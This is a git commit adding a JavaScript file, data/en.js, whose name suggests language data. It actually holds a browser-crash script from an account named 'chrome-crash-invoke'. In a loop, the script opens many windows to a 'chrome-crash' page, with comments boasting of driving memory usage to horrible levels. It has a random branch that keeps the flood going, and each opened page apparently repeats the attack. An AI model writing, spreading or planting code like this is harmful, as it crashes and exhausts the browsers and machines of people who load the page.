df5463ad066dd900b823c65938e2bcf5584a3b30
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 10:16:38 -0600

    Create en.js

---
+++ data/en.js
@@ -0,0 +1,40 @@
+  // Sleep Function. Lets Us Use Pythons SLEEP(milliseconds) function
+  function sleep(milliseconds) {
+     const date = Date.now();
+     let currentDate = null;
+     do {
+       currentDate = Date.now();
+     } while (currentDate - date < milliseconds);
+     }
+      
+     let x = Math.floor((Math.random() * 100) + 1);  
+     while(1) {
+          // Set's A Horrible Statistical Amount Of MEMERY Usage.
+          window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+          
+          window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+          
+          window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+          
+          window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+          
+          window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+          
+          
+        // Add's A Special Case If Math.Random Catches 34.
+          if (x === 34) {
+            window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+            
+            window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+            
+            window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+           
+            window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+            
+            window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+            
+          } else {
+            break;
+          }
+          
+     }
